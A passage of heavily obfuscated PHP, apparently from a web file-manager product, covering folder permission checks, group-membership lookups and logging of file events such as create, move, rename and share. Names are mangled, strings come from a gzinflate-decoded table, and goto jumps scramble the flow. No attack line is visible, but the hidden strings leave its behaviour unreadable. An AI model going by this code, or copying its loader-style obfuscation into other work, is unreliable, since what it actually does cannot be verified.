$ğĞ¬í’é[$ÀÄ¿Œ”[1772]]; } } return $ñ­‡•ê¡; } private function authFolderOwnerUser($ÌÇ…¯ºø) { $‚±ï‚æ· =& $_SERVER[¦»×‡Ãã]; $Ïüëö¶ª = array(); $äÙ±ºÜï = !1; foreach ($ÌÇ…¯ºø as $ß¼‰§¸) { $¥ü’óõÍ = $this->authInfo($ß¼‰§¸); if ($ß¼‰§¸[$‚±ï‚æ·[569]] == $‚±ï‚æ·[228]) { $äÙ±ºÜï = !0; } if ($ß¼‰§¸[$‚±ï‚æ·[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¥ü’óõÍ[$‚±ï‚æ·[487]])) { $Ïüëö¶ª[] = $ß¼‰§¸[$‚±ï‚æ·[569]]; } } } return array($‚±ï‚æ·[662] => $Ïüëö¶ª, $‚±ï‚æ·[2186] => $äÙ±ºÜï); } public function authMake($ş¬á¤·ƒ, $ş–º¿§Ê = false) { $à‘®âç¨ =& $_SERVER[¦»×‡Ãã]; $¼ÉÕ‰Ìê = $this->authArrayCheck($ş¬á¤·ƒ, $ş–º¿§Ê); if ($¼ÉÕ‰Ìê[$à‘®âç¨[2188]]) { $¼ÉÕ‰Ìê[$à‘®âç¨[2188]] = $this->sourceAuthInfo($¼ÉÕ‰Ìê[$à‘®âç¨[2188]]); } return $¼ÉÕ‰Ìê; } public function authArrayCheck($›‰ÈØŞ„, $ë…¼Ğ¬É = false) { $ê¥§Ï¶ï =& $_SERVER[¦»×‡Ãã]; if (!$›‰ÈØŞ„) { return array($ê¥§Ï¶ï[488] => 0, $ê¥§Ï¶ï[540] => !1); } $ë…¼Ğ¬É = $ë…¼Ğ¬É ? $ë…¼Ğ¬É : USER_ID; $˜ÍÂƒåÉ = 0; $¶øÄı = 0; $¾‚œÎò = 0; $Üî© ´æ = 0; $öµ„½Ş¾ = 0; $©”ÈŞÉš = 0; $³´ÌñÃó = 1000; $òäşûîÁ = 0; $¸À‡öÔ = 0; $¶ûÓ×Õ… = 0; $ã†×†àÜ = 0; $æÎÉÛÔì = array($ê¥§Ï¶ï[193] => 0); foreach ($›‰ÈØŞ„ as $æÎÉÛÔì) { $ÄˆâÌ°— = $this->authInfo($æÎÉÛÔì); if (!$ÄˆâÌ°—) { continue; } $÷ê¦½©Ú = $æÎÉÛÔì[$ê¥§Ï¶ï[569]]; $Ó×ï–÷ = intval($ÄˆâÌ°—[$ê¥§Ï¶ï[487]]); if ($æÎÉÛÔì[$ê¥§Ï¶ï[190]] == SourceModel::TYPE_USER && $÷ê¦½©Ú == $ë…¼Ğ¬É) { $˜ÍÂƒåÉ = !0; $¾‚œÎò = $ÄˆâÌ°—; $¶øÄı = $Ó×ï–÷; } else { if ($æÎÉÛÔì[$ê¥§Ï¶ï[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($÷ê¦½©Ú, $ë…¼Ğ¬É)) { $Üî© ´æ = !0; $›ßİ“½ = $this->groupStepToUserGroup($÷ê¦½©Ú, $ë…¼Ğ¬É); if ($›ßİ“½ < $³´ÌñÃó) { $³´ÌñÃó = $›ßİ“½; $öµ„½Ş¾ = $Ó×ï–÷; $©”ÈŞÉš = $ÄˆâÌ°—; $òäşûîÁ = $÷ê¦½©Ú; } if ($›ßİ“½ == $³´ÌñÃó && $Ó×ï–÷ >= $öµ„½Ş¾) { $öµ„½Ş¾ = $Ó×ï–÷; $©”ÈŞÉš = $ÄˆâÌ°—; $òäşûîÁ = $÷ê¦½©Ú; } } else { if ($÷ê¦½©Ú == $ê¥§Ï¶ï[228]) { $¸À‡öÔ = !0; $ã†×†àÜ = $ÄˆâÌ°—; $¶ûÓ×Õ… = $Ó×ï–÷; } } } } if ($˜ÍÂƒåÉ) { $éÑÜ¨¼© = $¶øÄı; $ÄˆâÌ°— = $¾‚œÎò; $İ†•‹œô = LNG($ê¥§Ï¶ï[2189]); } else { if ($Üî© ´æ) { $éÑÜ¨¼© = $öµ„½Ş¾; $ÄˆâÌ°— = $©”ÈŞÉš; $±ëæÓš¢ = Model($ê¥§Ï¶ï[585])->getInfo($òäşûîÁ); $İ†•‹œô = $ê¥§Ï¶ï[176] . $±ëæÓš¢[$ê¥§Ï¶ï[589]] . $ê¥§Ï¶ï[2190] . LNG($ê¥§Ï¶ï[2191]); } else { if ($¸À‡öÔ) { $éÑÜ¨¼© = $¶ûÓ×Õ…; $ÄˆâÌ°— = $ã†×†àÜ; $İ†•‹œô = LNG($ê¥§Ï¶ï[2161]); } else { $éÑÜ¨¼© = 0; $ÄˆâÌ°— = !1; $İ†•‹œô = $ê¥§Ï¶ï[12]; } } } $…£‹Û­’ = array($ê¥§Ï¶ï[2181] => intval($éÑÜ¨¼©), $ê¥§Ï¶ï[2164] => $ÄˆâÌ°—, $ê¥§Ï¶ï[2182] => $İ†•‹œô, $ê¥§Ï¶ï[2173] => $æÎÉÛÔì[$ê¥§Ï¶ï[193]]); return $…£‹Û­’; } private function groupContainUser($‡ñ’ş–Î, $ŞÔÆÙ = false) { return in_array($‡ñ’ş–Î, $this->userGroupParents($ŞÔÆÙ)); } private function groupStepToUserGroup($ò×á¹½à, $’ì××Ê = false) { $®½’á =& $_SERVER[¦»×‡Ãã]; $Œ­šºº® = $this->userGroupList($’ì××Ê); $„ıÕ¿şù = 1000; $ôüò”úÓ = $GLOBALS[$®½’á[6]][$®½’á[92]][$®½’á[2078]] == 1; $ÛÖ‘ËÜá = $ôüò”úÓ ? 3 : 2; foreach ($Œ­šºº® as $“íœÂŒ) { if ($“íœÂŒ[$®½’á[1971]] == $ò×á¹½à) { return 0; } $°”ı´´ö = explode($®½’á[50], trim($“íœÂŒ[$®½’á[584]], $®½’á[50])); if ($°”ı´´ö[0] == $®½’á[228] && count($°”ı´´ö) > $ÛÖ‘ËÜá) { $ˆ–ô› = array_reverse(array_slice($°”ı´´ö, $ÛÖ‘ËÜá)); $Ü´±éê‰ = array_search($ò×á¹½à, $ˆ–ô›); if ($Ü´±éê‰ !== !1 && $Ü´±éê‰ + 1 <= $„ıÕ¿şù) { $„ıÕ¿şù = $Ü´±éê‰ + 1; } } } return $„ıÕ¿şù; } private function userGroupList($Ä«ı¤‚ = false) { $Ã…îªÚ =& $_SERVER[¦»×‡Ãã]; static $ŞÆ£íäƒ = array(); if (isset($ŞÆ£íäƒ[$Ä«ı¤‚])) { return $ŞÆ£íäƒ[$Ä«ı¤‚]; } $ñêå”ù = Model($Ã…îªÚ[598])->getInfo($Ä«ı¤‚); $ŞÆ£íäƒ[$Ä«ı¤‚] = array_to_keyvalue($ñêå”ù[$Ã…îªÚ[2162]], $Ã…îªÚ[1971]); return $ŞÆ£íäƒ[$Ä«ı¤‚]; } public function userGroupParents($¦Œïª©¾) { $ª¨ë¥”î =& $_SERVER[¦»×‡Ãã]; static $úÃÚ² = array(); $¦Œïª©¾ = $¦Œïª©¾ ? $¦Œïª©¾ : USER_ID; if (isset($úÃÚ²[$¦Œïª©¾])) { return $úÃÚ²[$¦Œïª©¾]; } $ıœÍÓƒİ = $this->userGroupList($¦Œïª©¾); $«€¥Ş©ñ = array(); $¼ú•“¬ = $GLOBALS[$ª¨ë¥”î[6]][$ª¨ë¥”î[92]][$ª¨ë¥”î[2078]] == 1; $¯ºÑá´ = $¼ú•“¬ ? 3 : 2; foreach ($ıœÍÓƒİ as $Ç·…‰Äê) { $†ŠãÊâÇ = array($Ç·…‰Äê[$ª¨ë¥”î[1971]]); $ĞÀî¨Œ = explode($ª¨ë¥”î[50], trim($Ç·…‰Äê[$ª¨ë¥”î[584]], $ª¨ë¥”î[50])); if ($ĞÀî¨Œ[0] == $ª¨ë¥”î[228] && count($ĞÀî¨Œ) > $¯ºÑá´) { $æ«âÛÚ” = array_slice($ĞÀî¨Œ, $¯ºÑá´); $†ŠãÊâÇ = array_merge($†ŠãÊâÇ, array_reverse($æ«âÛÚ”)); } $«€¥Ş©ñ = array_merge($«€¥Ş©ñ, $†ŠãÊâÇ); } $úÃÚ²[$¦Œïª©¾] = array_unique($«€¥Ş©ñ); return $úÃÚ²[$¦Œïª©¾]; } public function authTargetInfoMake($»‹¢ÊŸä) { $‰»¨ëÏ =& $_SERVER[¦»×‡Ãã]; $¥ËŠŸÎ¢ = array(); $‹¢‰Äğ— = array(); foreach ($»‹¢ÊŸä as $¦™œ•µ) { if ($¦™œ•µ[$‰»¨ëÏ[190]] == SourceModel::TYPE_USER) { $¥ËŠŸÎ¢[] = intval($¦™œ•µ[$‰»¨ëÏ[569]]); } else { if ($¦™œ•µ[$‰»¨ëÏ[190]] == SourceModel::TYPE_GROUP) { $‹¢‰Äğ—[] = intval($¦™œ•µ[$‰»¨ëÏ[569]]); } } } if ($¥ËŠŸÎ¢) { $¥ËŠŸÎ¢ = Model($‰»¨ëÏ[577])->userListInfo($¥ËŠŸÎ¢); } if ($‹¢‰Äğ—) { $óáíñÀ’ = array($‰»¨ëÏ[2063] => array($‰»¨ëÏ[492], $‹¢‰Äğ—)); $‹¢‰Äğ— = Model($‰»¨ëÏ[585])->field($‰»¨ëÏ[2192])->where($óáíñÀ’)->select(); $‹¢‰Äğ— = array_to_keyvalue($‹¢‰Äğ—, $‰»¨ëÏ[1971]); } return array($‰»¨ëÏ[2193] => $¥ËŠŸÎ¢, $‰»¨ëÏ[2194] => $‹¢‰Äğ—); } public function authInfo($Šíóë²) { $¾¦šÎ§Ã =& $_SERVER[¦»×‡Ãã]; if ($Šíóë²[$¾¦šÎ§Ã[2079]]) { $Êë”ÎÙ¤ = Model($¾¦šÎ§Ã[571])->listData($Šíóë²[$¾¦šÎ§Ã[2079]]); if (!$Êë”ÎÙ¤) { return !1; $şèÍÍ”ã = Model($¾¦šÎ§Ã[571])->listData(); $•çã¤ó• = array_filter_by_field($şèÍÍ”ã, $¾¦šÎ§Ã[487], $¾¦šÎ§Ã[228]); return $•çã¤ó•; } $ĞË¥Å = array_field_key($Êë”ÎÙ¤, array($¾¦šÎ§Ã[475], $¾¦šÎ§Ã[32], $¾¦šÎ§Ã[487], $¾¦šÎ§Ã[1994], $¾¦šÎ§Ã[1995])); $ĞË¥Å[$¾¦šÎ§Ã[2195]] = $Šíóë²; return $ĞË¥Å; } else { return array($¾¦šÎ§Ã[493] => 0, $¾¦šÎ§Ã[1977] => $Šíóë²[$¾¦šÎ§Ã[2139]], $¾¦šÎ§Ã[494] => $¾¦šÎ§Ã[12], $¾¦šÎ§Ã[1994] => $¾¦šÎ§Ã[2196]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\143\x65\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\155\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\x72\164", "\146\165\x6e\143\164\x69\x6f\156"), array("\x64\x65\163\x63", '', "\151\156\163\145\162\164\x2c\165\160\144\141\x74\x65\54\163\145\x6c\x65\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ãîªºº, $øùª©æ†, $ßˆãòÚ¢ = '') { $æîš¡İ =& $_SERVER[¦»×‡Ãã]; if (!$this->eventSave) { return; } $¬‰†¢Ãã = Model($æîš¡İ[1420])->sourceInfo($Ãîªºº); if (!$¬‰†¢Ãã) { return !1; } if ($this->isDisableEvent($¬‰†¢Ãã, $øùª©æ†)) { return; } if ($ßˆãòÚ¢ && is_string($ßˆãòÚ¢)) { $ßˆãòÚ¢ = array($æîš¡İ[2010] => $ßˆãòÚ¢); } $ã½ôïö¤ = defined($æîš¡İ[2197]) ? USER_ID : 0; $Àï™Ê™ = array($æîš¡İ[491] => $Ãîªºº, $æîš¡İ[2198] => $¬‰†¢Ãã[$æîš¡İ[192]], $æîš¡İ[2199] => $¬‰†¢Ãã[$æîš¡İ[32]], $æîš¡İ[582] => !empty($¬‰†¢Ãã[$æîš¡İ[582]]) ? $¬‰†¢Ãã[$æîš¡İ[582]] : $æîš¡İ[12], $æîš¡İ[1763] => $ã½ôïö¤, $æîš¡İ[496] => $øùª©æ†, $æîš¡İ[1765] => $ßˆãòÚ¢); $this->addSystemLog($øùª©æ†, $Àï™Ê™); unset($Àï™Ê™[$æîš¡İ[2199]], $Àï™Ê™[$æîš¡İ[582]]); return $this->add($Àï™Ê™); } private function addSystemLog($“àµõøå, $ÒÌ»£±•) { $”ç«å¶ =& $_SERVER[¦»×‡Ãã]; if ($“àµõøå == $”ç«å¶[2200]) { $“àµõøå = $ÒÌ»£±•[$”ç«å¶[526]][$”ç«å¶[2201]]; } else { if (in_array($“àµõøå, array($”ç«å¶[1950], $”ç«å¶[2202]))) { $“àµõøå = $ÒÌ»£±•[$”ç«å¶[526]][$”ç«å¶[171]]; } } $ª›¥’¬Î = array_merge($ÒÌ»£±•, array($”ç«å¶[2203] => $ÒÌ»£±•[$”ç«å¶[193]], $”ç«å¶[2204] => $ÒÌ»£±•[$”ç«å¶[2204]])); Hook::trigger($”ç«å¶[2205], $”ç«å¶[2206] . $“àµõøå, $ÒÌ»£±•); Model($”ç«å¶[1914])->addLog($”ç«å¶[2206] . $“àµõøå, $ª›¥’¬Î); } private function isDisableEvent($Ó†«‰¬ì, $‚¥¬Ô¯ù) { $›‘ÇãÃ =& $_SERVER[¦»×‡Ãã]; if ($Ó†«‰¬ì[$›‘ÇãÃ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‚¥¬Ô¯ù == $›‘ÇãÃ[1939]) { return !1; } return !0; } public function eventCreate($íÅÈ·ÆÃ, $ğÙãôØ) { $…¿†®ğÊ =& $_SERVER[¦»×‡Ãã]; $ÅÀ˜—ëı = Model($…¿†®ğÊ[1420])->sourceInfo($íÅÈ·ÆÃ); $šÉ ûÎ› = array($…¿†®ğÊ[2201] => $ğÙãôØ, $…¿†®ğÊ[32] => $ÅÀ˜—ëı[$…¿†®ğÊ[32]]); return $this->addEvent($íÅÈ·ÆÃ, $…¿†®ğÊ[2200], $šÉ ûÎ›); } public function eventFileEdit($è˜Á½‰) { $çøäÉÍ =& $_SERVER[¦»×‡Ãã]; $‚Ü¾ıëÖ = array($çøäÉÍ[2207] => $_SERVER[$çøäÉÍ[2208]], $çøäÉÍ[2209] => strtolower(ACTION)); if (isset($GLOBALS[$çøäÉÍ[7]][$çøäÉÍ[2210]])) { $‚Ü¾ıëÖ[$çøäÉÍ[2210]] = $çøäÉÍ[91]; } return $this->addEvent($è˜Á½‰, $çøäÉÍ[1940], $‚Ü¾ıëÖ); } public function eventRecycle($â¾«š , $Ãú½Ôµ“) { return $this->addEvent($â¾«š , $_SERVER[¦»×‡Ãã][2202], $Ãú½Ôµ“); } private static $_removeLast = ''; public function eventRemove($şî›òË) { $Ú¢ùÜÏ =& $_SERVER[¦»×‡Ãã]; self::$_removeLast = $şî›òË; $†À¾—Ù© = Model($Ú¢ùÜÏ[1420])->sourceInfo($şî›òË); $õ±îáô = array_field_key($†À¾—Ù©, array($Ú¢ùÜÏ[193], $Ú¢ùÜÏ[541], $Ú¢ùÜÏ[505], $Ú¢ùÜÏ[584])); $·¬¹¦úå = array($Ú¢ùÜÏ[171] => $†À¾—Ù©[$Ú¢ùÜÏ[32]], $Ú¢ùÜÏ[2209] => ACTION, $Ú¢ùÜÏ[2211] => $õ±îáô); return $this->addEvent($†À¾—Ù©[$Ú¢ùÜÏ[192]], $Ú¢ùÜÏ[1939], $·¬¹¦úå); } public function eventShare($üÍè’Øé, $ÁÒ™¢¥Ú) { return $this->addEvent($üÍè’Øé, $_SERVER[¦»×‡Ãã][1950], $ÁÒ™¢¥Ú); } public function eventMove($õ£ßõ, $Ê”ôÁ°¦, $ú­‘ä) { $²ê¯•µÓ =& $_SERVER[¦»×‡Ãã]; if (self::$_removeLast == $õ£ßõ) { return; } $òùÒË°¥ = Model($²ê¯•µÓ[1420]); $î½Ô¦ë– = $òùÒË°¥->sourceInfo($õ£ßõ); $‚¸Äù® = $òùÒË°¥->sourceInfo($Ê”ôÁ°¦); $š°ş£ = $òùÒË°¥->sourceInfo($ú­‘ä); $å˜öÔ‚‘ = array($²ê¯•µÓ[1241] => $Ê”ôÁ°¦, $²ê¯•µÓ[2212] => $‚¸Äù®[$²ê¯•µÓ[32]], $²ê¯•µÓ[2188] => !empty($‚¸Äù®[$²ê¯•µÓ[582]]) ? $‚¸Äù®[$²ê¯•µÓ[582]] : $²ê¯•µÓ[12], $²ê¯•µÓ[1242] => $ú­‘ä, $²ê¯•µÓ[2213] => $š°ş£[$²ê¯•µÓ[32]], $²ê¯•µÓ[2214] => !empty($š°ş£[$²ê¯•µÓ[582]]) ? $š°ş£[$²ê¯•µÓ[582]] : $²ê¯•µÓ[12]); $this->addEvent($õ£ßõ, $²ê¯•µÓ[620], $å˜öÔ‚‘); $î½Ô¦ë– = $òùÒË°¥->sourceInfo($õ£ßõ); $å˜öÔ‚‘ = array($²ê¯•µÓ[193] => $î½Ô¦ë–[$²ê¯•µÓ[193]], $²ê¯•µÓ[32] => $î½Ô¦ë–[$²ê¯•µÓ[32]]); $this->addEvent($Ê”ôÁ°¦, $²ê¯•µÓ[2215], $å˜öÔ‚‘); } public function eventCopy($çø˜éŠØ) { $this->eventCreate($çø˜éŠØ, $_SERVER[¦»×‡Ãã][618]); } public function eventRename($¢¾˜âÔ“, $Š±ŞÎ—Ş, $î§õËåï) { $¦÷‡¤¡° =& $_SERVER[¦»×‡Ãã]; $µêûœİ = array($¦÷‡¤¡°[1241] => $Š±ŞÎ—Ş, $¦÷‡¤¡°[1242] => $î§õËåï); return $this->addEvent($¢¾˜âÔ“, $¦÷‡¤¡°[1434], $µêûœİ); } public function eventAddComment($ìÂŞ‡äš, $ÖÛ·»„) { return $this->addEvent($ìÂŞ‡äš, $_SERVER[¦»×‡Ãã][2216], $ÖÛ·»„); } public function eventAddDesc($®Í–¶ñİ, $ª£ÇÈ£¶) { return $this->addEvent($®Í–¶ñİ, $_SERVER[¦»×‡Ãã][2217], $ª£ÇÈ£¶); } public function listBySource($³¸å¸§Ş) { $í×¿ú»± =& $_SERVER[¦»×‡Ãã]; $‡Şµ¡Š = Model($í×¿ú»±[1420])->sourceInfo($³¸å¸§Ş); $ä¡ëÅº­ = array($í×¿ú»±[491] => $³¸å¸§Ş); if ($‡Şµ¡Š[$í×¿ú»±[485]] == $í×¿ú»±[91]) { $åœ¥¯ª = Model($í×¿ú»±[1420])->listSearchChildren($³¸å¸§Ş, 20000); $åœ¥¯ª[] = $³¸å¸§Ş . $í×¿ú»±[454]; $ä¡ëÅº­ = array($í×¿ú»±[193] => array($í×¿ú»±[7], $åœ¥¯ª)); } $—¯ıµİî = $this->where($ä¡ëÅº­)->order($í×¿ú»±[2218])->selectPage(); if ($—¯ıµİî[$í×¿ú»±[442]][$í×¿ú»±[443]] == 0) { $—¯ıµİî[$í×¿ú»±[442]][$í×¿ú»±[443]] = 1; $—¯ıµİî[$í×¿ú»±[445]] = array(array($í×¿ú»±[491] => $³¸å¸§Ş, $í×¿ú»±[2198] => $‡Şµ¡Š[$í×¿ú»±[192]], $í×¿ú»±[1763] => $‡Şµ¡Š[$í×¿ú»±[527]], $í×¿ú»±[496] => $í×¿ú»±[2219], $í×¿ú»±[497] => $‡Şµ¡Š[$í×¿ú»±[231]], $í×¿ú»±[1765] => $í×¿ú»±[12])); } return $this->eventListParse($—¯ıµİî, $³¸å¸§Ş); } private function eventListParse($Ã¬§‚°î, $°„“îóƒ) { $ìòÇ›¬ì =& $_SERVER[¦»×‡Ãã]; $“£ğÁµÍ = $Ã¬§‚°î[$ìòÇ›¬ì[445]]; $°ÏŒ‘Ãá = array_to_keyvalue($“£ğÁµÍ, $ìòÇ›¬ì[12], $ìòÇ›¬ì[193]); $êÓÓøòî = array_to_keyvalue($“£ğÁµÍ, $ìòÇ›¬ì[12], $ìòÇ›¬ì[2204]); foreach ($“£ğÁµÍ as $Ì·ƒÏ—) { $ßäãª·ƒ = $Ì·ƒÏ—[$ìòÇ›¬ì[526]]; if ($Ì·ƒÏ—[$ìòÇ›¬ì[33]] == $ìòÇ›¬ì[620] && isset($ßäãª·ƒ[$ìòÇ›¬ì[1241]])) { $°ÏŒ‘Ãá[] = $ßäãª·ƒ[$ìòÇ›¬ì[1241]] . $ìòÇ›¬ì[12]; $°ÏŒ‘Ãá[] = $ßäãª·ƒ[$ìòÇ›¬ì[1242]] . $ìòÇ›¬ì[12]; } if ($Ì·ƒÏ—[$ìòÇ›¬ì[33]] == $ìòÇ›¬ì[2215] && isset($ßäãª·ƒ[$ìòÇ›¬ì[193]])) { $°ÏŒ‘Ãá[] = $ßäãª·ƒ[$ìòÇ›¬ì[193]] . $ìòÇ›¬ì[12]; } } $°ÏŒ‘Ãá = array_merge($°ÏŒ‘Ãá, $êÓÓøòî, array($°„“îóƒ . $ìòÇ›¬ì[12])); $°ÏŒ‘Ãá = array_unique($°ÏŒ‘Ãá); $¯¹±Û…Ù = array_unique(array_to_keyvalue($“£ğÁµÍ, $ìòÇ›¬ì[12], $ìòÇ›¬ì[1772])); $‰Â‡È¬ˆ = Model($ìòÇ›¬ì[598])->userListInfo($¯¹±Û…Ù); $ĞÊ÷¦û = Model($ìòÇ›¬ì[897])->sourceListInfo($°ÏŒ‘Ãá, !0); foreach ($“£ğÁµÍ as &$Ì·ƒÏ—) { if ($Ì·ƒÏ—[$ìòÇ›¬ì[33]] == $ìòÇ›¬ì[620] && isset($Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[1241]])) { $Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[1241]] = $ĞÊ÷¦û[$Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[1241]]]; $Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[1242]] = $ĞÊ÷¦û[$Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[1242]]]; } if ($Ì·ƒÏ—[$ìòÇ›¬ì[33]] == $ìòÇ›¬ì[2215] && isset($Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[193]])) { $Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[193]] = $ĞÊ÷¦û[$Ì·ƒÏ—[$ìòÇ›¬ì[526]][$ìòÇ›¬ì[193]]]; } $Ì·ƒÏ—[$ìòÇ›¬ì[90]] = $ĞÊ÷¦û[$Ì·ƒÏ—[$ìòÇ›¬ì[193]]]; $Ì·ƒÏ—[$ìòÇ›¬ì[2220]] = $ĞÊ÷¦û[$Ì·ƒÏ—[$ìòÇ›¬ì[2204]]]; if ($Ì·ƒÏ—[$ìòÇ›¬ì[33]] == $ìòÇ›¬ì[1939]) { $Ì·ƒÏ—[$ìòÇ›¬ì[2220]] = $Ì·ƒÏ—[$ìòÇ›¬ì[90]]; $Ì·ƒÏ—[$ìòÇ›¬ì[2204]] = $Ì·ƒÏ—[$ìòÇ›¬ì[2220]][$ìòÇ›¬ì[193]]; $Ì·ƒÏ—[$ìòÇ›¬ì[90]] = !1; $Ì·ƒÏ—[$ìòÇ›¬ì[193]] = $ìòÇ›¬ì[12]; } $Ì·ƒÏ—[$ìòÇ›¬ì[2147]] = $‰Â‡È¬ˆ[$Ì·ƒÏ—[$ìòÇ›¬ì[1772]]]; } unset($Ì·ƒÏ—); $Ã¬§‚°î[$ìòÇ›¬ì[445]] = $“£ğÁµÍ; return $Ã¬§‚°î; } public function removeBySource($ÖÚé®æ) { $ãÁ£ÄÈã = array($_SERVER[¦»×‡Ãã][491] => $ÖÚé®æ); $this->where($ãÁ£ÄÈã)->remove(); } } goto fïäï÷¦§â; aŞ¸ÌíÑÁ: define($_SERVER[¦»×‡Ãã][0], $_SERVER[¦»×‡Ãã][1]); $_SERVER[º‚¢É§í] = explode($_SERVER[¦»×‡Ãã][2], gzinflate(substr($_SERVER[¦»×‡Ãã][3], 10, -8))); function binCheckEq($Á§„å´, $†ûÈ’) { return $Á§„å´ == $†ûÈ’; } goto a¹ëŠëòÛ; fÖš’ÆÄ±: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x4c\151\x67\150\x74\101\160\160"; public $modelType = "\x53\171\163\164\x65\155\117\x70\164\151\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\147\x72\157\165\160", "\x64\145\x73\143", "\x63\157\156\x74\145\x6e\x74"); public function listData($Å„¾çâÏ = false, $ºËµ£‚à = "\155\x6f\x64\151\x66\x79\x54\x69\x6d\145", $øï¶ïù‡ = true) { return parent::listData($Å„¾çâÏ, $ºËµ£‚à, $øï¶ïù‡); } public function remove($¶Œï­á¬) { $ÎªŸû† = $this->findByName($¶Œï­á¬); if (!$ÎªŸû†) { return !1; } return parent::remove($ÎªŸû†[$_SERVER[¦»×‡Ãã][475]]); } public function add($ñ´ÙŠ) { if ($this->findByName($ñ´ÙŠ[$_SERVER[¦»×‡Ãã][32]])) { return !1; } return parent::insert($ñ´ÙŠ); } public function update($¤ÎÚ–Âñ, $»ÕŒ¥Ø½) { $€¤„×„« =& $_SERVER[¦»×‡Ãã]; $ Ÿ¾Šºª = $this->findByName($¤ÎÚ–Âñ); $ã€ã­øĞ = $this->findByName($»ÕŒ¥Ø½[$€¤„×„«[32]]); if (!$ Ÿ¾Šºª || $ã€ã­øĞ && $ã€ã­øĞ[$€¤„×„«[475]] != $ Ÿ¾Šºª[$€¤„×„«[475]]) { return !1; } return parent::update($ Ÿ¾Šºª[$€¤„×„«[475]], $»ÕŒ¥Ø½); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\151\155\145", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $„ Ëš¬ª =& $_SERVER[¦»×‡Ãã]; return array($„ Ëš¬ª[2331] => LNG($„ Ëš¬ª[2332]), $„ Ëš¬ª[2333] => LNG($„ Ëš¬ª[2334]), $„ Ëš¬ª[1913] => LNG($„ Ëš¬ª[2335]), $„ Ëš¬ª[2336] => LNG($„ Ëš¬ª[2337]), $„ Ëš¬ª[2338] => LNG($„ Ëš¬ª[2339]), $„ Ëš¬ª[2340] => LNG($„ Ëš¬ª[2341]), $„ Ëš¬ª[2342] => LNG($„ Ëš¬ª[2343]), $„ Ëš¬ª[1943] => LNG($„ Ëš¬ª[2343]), $„ Ëš¬ª[1944] => LNG($„ Ëš¬ª[2344]), $„ Ëš¬ª[2345] => LNG($„ Ëš¬ª[2346]), $„ Ëš¬ª[2347] => LNG($„ Ëš¬ª[2348]), $„ Ëš¬ª[2349] => LNG($„ Ëš¬ª[2350]), $„ Ëš¬ª[2351] => LNG($„ Ëš¬ª[2352]), $„ Ëš¬ª[1941] => LNG($„ Ëš¬ª[2353]), $„ Ëš¬ª[2354] => LNG($„ Ëš¬ª[2355]), $„ Ëš¬ª[1948] => LNG($„ Ëš¬ª[2356]), $„ Ëš¬ª[2357] => LNG($„ Ëš¬ª[2358]), $„ Ëš¬ª[2359] => LNG($„ Ëš¬ª[2360]), $„ Ëš¬ª[2361] => LNG($„ Ëš¬ª[2362]), $„ Ëš¬ª[2363] => LNG($„ Ëš¬ª[2364]), $„ Ëš¬ª[1951] => LNG($„ Ëš¬ª[2365]), $„ Ëš¬ª[1952] => LNG($„ Ëš¬ª[2366]), $„ Ëš¬ª[2367] => LNG($„ Ëš¬ª[2368]), $„ Ëš¬ª[2369] => LNG($„ Ëš¬ª[2370]), $„ Ëš¬ª[2371] => LNG($„ Ëš¬ª[2372]), $„ Ëš¬ª[1946] => LNG($„ Ëš¬ª[2373]), $„ Ëš¬ª[2374] => LNG($„ Ëš¬ª[2375]), $„ Ëš¬ª[1945] => LNG($„ Ëš¬ª[2376]), $„ Ëš¬ª[2377] => LNG($„ Ëš¬ª[2378]), $„ Ëš¬ª[2379] => LNG($„ Ëš¬ª[2380]), $„ Ëš¬ª[2381] => LNG($„ Ëš¬ª[2380]), $„ Ëš¬ª[2382] => LNG($„ Ëš¬ª[2383]), $„ Ëš¬ª[2384] => LNG($„ Ëš¬ª[2384]), $„ Ëš¬ª[2385] => LNG($„ Ëš¬ª[1917]), $„ Ëš¬ª[2386] => LNG($„ Ëš¬ª[2387]), $„ Ëš¬ª[2388] => LNG($„ Ëš¬ª[2389]), $„ Ëš¬ª[2390] => LNG($„ Ëš¬ª[2391]), $„ Ëš¬ª[2392] => LNG($„ Ëš¬ª[2393]), $„ Ëš¬ª[2394] => LNG($„ Ëš¬ª[2395]), $„ Ëš¬ª[2396] => LNG($„ Ëš¬ª[2396]), $„ Ëš¬ª[2397] => LNG($„ Ëš¬ª[2398]), $„ Ëš¬ª[2399] => LNG($„ Ëš¬ª[2400]), $„ Ëš¬ª[2401] => LNG($„ Ëš¬ª[2402]), $„ Ëš¬ª[2403] => LNG($„ Ëš¬ª[2404]), $„ Ëš¬ª[2405] => LNG($„ Ëš¬ª[2406]), $„ Ëš¬ª[2407] => LNG($„ Ëš¬ª[2408]), $„ Ëš¬ª[212] => LNG($„ Ëš¬ª[212]), $„ Ëš¬ª[213] => LNG($„ Ëš¬ª[2409]), $„ Ëš¬ª[2410] => LNG($„ Ëš¬ª[2410])); } private function typeFile() { $‹‹ü«ç¡ =& $_SERVER[¦»×‡Ãã]; $øŞ¶¨›¹ = array($‹‹ü«ç¡[1948] => array($‹‹ü«ç¡[1949]), $‹‹ü«ç¡[2349] => array($‹‹ü«ç¡[2411]), 